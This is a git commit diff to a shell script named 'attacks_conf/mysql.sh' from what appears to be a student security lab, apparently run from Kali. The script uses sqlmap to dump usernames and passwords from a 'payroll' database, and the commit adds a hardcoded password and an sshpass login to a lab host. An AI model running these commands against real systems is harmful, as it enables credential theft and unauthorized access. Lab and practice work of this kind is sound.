7165bc930d68edbc1475c1586c47807920d96f02
Bartłomiej Matejuk <bartek.matejuk.szkola@gmail.com>
2024-04-26 18:23:58 +0200

    edit mysql.sh script
    Co-authored-by: 254044 <162146517+254044@users.noreply.github.com>

--- attacks_conf/mysql.sh
+++ attacks_conf/mysql.sh
@@ -2,3 +2,6 @@
 
 
 sqlmap -r /home/kali/baw-git/attacks_conf/request.txt --batch -D payroll -T users -C username,password --dump
+
+PASSWORD=help_me_obiwan
+sshpass -p $PASSWORD ssh -q leia_organa@192.168.100.86 'groups'
